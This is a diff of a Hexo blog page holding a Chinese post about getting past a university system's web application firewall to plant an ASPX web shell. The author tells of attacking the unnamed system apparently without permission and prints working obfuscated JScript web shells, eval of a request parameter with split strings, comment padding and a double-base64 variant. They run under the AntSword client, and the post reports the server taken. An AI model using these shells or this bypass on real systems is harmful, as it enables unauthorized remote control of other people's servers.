@@ -13,7 +13,7 @@
 <meta property="og:url" content="http://yoursite.com/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
+<meta property="article:author" content="阿欢">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
@@ -46,7 +46,7 @@
 			<img src="" class="js-avatar">
 		</a>
 		<hgroup>
-		  <h1 class="header-author"><a href="/">John Doe</a></h1>
+		  <h1 class="header-author"><a href="/">阿欢</a></h1>
 		</hgroup>
 		
 
@@ -104,7 +104,7 @@
 				<img src="" class="js-avatar">
 			</div>
 			<hgroup>
-			  <h1 class="header-author js-header-author">John Doe</h1>
+			  <h1 class="header-author js-header-author">阿欢</h1>
 			</hgroup>
 			
 			
@@ -173,25 +173,33 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p><strong>前言</strong></p>
-<p>本次绕过waf是因为之前拿了某个厂商的源码,发现了新的洞洞,所以对之前没有拿下来的一个系统的再次日日日…………….</p>
+<p>本次绕过waf是因为之前拿了某个厂商的源码,发现了新的洞洞,所以对之前没有拿下来的一个系统的再次日日日(某985大学waf)…………….</p>
+<p>基本情况是可以写入aspx文件  需要绕过waf</p>
 <p><strong>困难重重</strong></p>
-<p>自己尝试的时候 找了很多免杀小马 统统不得劲  这个waf 检测了很多关键字  什么 request  creatobject   write(…) 等等 经过一个晚上和上午的战斗 还是拿不下来， 于是找了位大哥帮忙，大哥果然是大哥，发现了http参数污染<br><img src="/2020/03/30/test/2.jpg" alt="test"></p>
-<p><img src="/2020/03/30/test/1.jpg" alt="test"></p>
+<p>自己尝试的时候 找了很多免杀小马 统统不得劲  这个waf 检测了很多关键字  什么 request  creatobject   write(…) 等等 经过一个晚上和上午的战斗 还是拿不下来， 于是找了位大哥帮忙，大哥果然是大哥，发现了http参数污染</p>
+<p><img src="/2020/03/30/test/2.png" alt="test"><br><img src="/2020/03/30/test/1.png" alt="test"></p>
 <p>这种参数污染我实践中还没遇到过,实属第一次  我以前以为参数污染 要么 服务端会取前一个 要么会取后一个  ，竟然还可以把前后拼接 ,可以,很吊!</p>
 <p>那么这个dog waf 基本上已经是完了  利用多个code 把关键词拆分就好 </p>
 <p>上面说到了 产生的文件中code参数之间会有,  这个简单 直接用注释就好</p>
 <p>好了 让我们来实践一下<br>因为服务端会自动解码url一次所以我们来urlencode一下</p>
-<p>把我的双重base64小马分成两截<br><img src="/2020/03/30/test/3.jpg" alt="test"><br><img src="/2020/03/30/test/4.jpg" alt="test"></p>
+<p>把我的双重base64小马分成两截<br><img src="/2020/03/30/test/3.png" alt="test"><br><img src="/2020/03/30/test/4.png" alt="test"></p>
 <p>然后发包 发现过不鸟    经过测试发现是  &lt;% %&gt; 这两个东西的问题</p>
 <p>我去掉payload 开头的  &lt;%  就可以过  eval 在 &lt;%  %&gt; 之间就不行   也就是 &lt;% eval(xxx) %&gt; 是不行滴   这就不好搞了<br>经过大哥的指点我找到 <a href="https://www.cnblogs.com/xiaozi/p/7566795.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/7566795.html</a> 这里面的  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language &#x3D; Jscript %&gt;</span><br><span class="line">&lt;%var&#x2F;*-&#x2F;*-*&#x2F;P&#x2F;*-&#x2F;*-*&#x2F;&#x3D;&#x2F;*-&#x2F;*-*&#x2F;&quot;e&quot;+&quot;v&quot;+&#x2F;*-&#x2F;*-*&#x2F;</span><br><span class="line">&quot;a&quot;+&quot;l&quot;+&quot;(&quot;+&quot;R&quot;+&quot;e&quot;+&#x2F;*-&#x2F;*-*&#x2F;&quot;q&quot;+&quot;u&quot;+&quot;e&quot;&#x2F;*-&#x2F;*-*&#x2F;+&quot;s&quot;+&quot;t&quot;+</span><br><span class="line">&quot;[&#x2F;*-&#x2F;*-*&#x2F;0&#x2F;*-&#x2F;*-*&#x2F;-&#x2F;*-&#x2F;*-*&#x2F;2&#x2F;*-&#x2F;*-*&#x2F;-&#x2F;*-&#x2F;*-*&#x2F;5&#x2F;*-&#x2F;*-*&#x2F;]&quot;+</span><br><span class="line">&quot;,&quot;+&quot;\&quot;&quot;+&quot;u&quot;+&quot;n&quot;+&quot;s&quot;&#x2F;*-&#x2F;*-*&#x2F;+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;+&quot;\&quot;&quot;+&quot;)&quot;;eval</span><br><span class="line">(&#x2F;*-&#x2F;*-*&#x2F;P&#x2F;*-&#x2F;*-*&#x2F;,&#x2F;*-&#x2F;*-*&#x2F;&quot;u&quot;+&quot;n&quot;+&quot;s&quot;&#x2F;*-&#x2F;*-*&#x2F;+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;&#x2F;*-&#x2F;*-*&#x2F;);%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>我尝试过程中发现 直接用下面这个payload也可以      这个参数污染有点可以 第一次见</p>
-<p>最终的payload:</p>
+<p>我尝试过程中发现 直接用下面这个payload也可以    所以就没利用参数污染了 </p>
+<p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%  </span><br><span class="line">var P&#x3D;&quot;ev&quot;+&quot;al&quot;+&quot;(Requ&quot;+&quot;est.Item[\&quot;zz\&quot;],\&quot;unsafe\&quot;)&quot;;</span><br><span class="line">eval&#x2F;*-&#x2F;*-*&#x2F;(&#x2F;*-&#x2F;*-*&#x2F;P&#x2F;*-&#x2F;*-*&#x2F;,&#x2F;*-&#x2F;*-*&#x2F;&quot;u&quot;+&quot;n&quot;+&quot;s&quot;&#x2F;*-&#x2F;*-*&#x2F;+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;&#x2F;*-&#x2F;*-*&#x2F;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
-<p>有点搞笑的是:</p>
-<p>…………. 搞了半天  白搞了一些…   我没有在对应上传的包里测试code参数 我是 直接随便post一个地址 在post内容里尝试…..<br>结果效果不一样….   同样的payload 在上传中 作为code参数是可以过  但是 我刚才测试是直接post ip 然后加payload 这样是过不鸟的……尴尬….</p>
-<p><img src="/2020/03/30/test/5.jpg" alt></p>
+<p><strong>有点搞笑的是:</strong></p>
+<p>…………. 搞了半天  白搞了一些…   我没有在对应上传的包里测试code参数 我是 直接随便post一个地址 在post内容里尝试…..<br>结果效果不一样….   同样的payload 在上传中 作为code参数是可以过  但是 我刚才测试是直接post ip 然后加payload 这样是过不鸟的……尴尬…. 是我想当然了…….</p>
+<p><img src="/2020/03/30/test/5.png" alt></p>
+<p><strong>最终</strong>：</p>
+<p>写入一个 双重base64小马即可  配合蚁剑 成功拿下 </p>
+<p><strong>payload</strong>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%  </span><br><span class="line">var P&#x3D;&quot;ev&quot;+&quot;al(&quot;+&quot;System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Requ&quot;+&quot;est.Item[\&quot;zz\&quot;]))))&quot;+&quot;,\&quot;unsafe\&quot;)&quot;;</span><br><span class="line">eval&#x2F;*-&#x2F;*-*&#x2F;(&#x2F;*-&#x2F;*-*&#x2F;P&#x2F;*-&#x2F;*-*&#x2F;,&#x2F;*-&#x2F;*-*&#x2F;&quot;u&quot;+&quot;n&quot;+&quot;s&quot;&#x2F;*-&#x2F;*-*&#x2F;+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;&#x2F;*-&#x2F;*-*&#x2F;);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
 
       
 
@@ -266,7 +274,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2020 John Doe
+    		&copy; 2020 阿欢
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
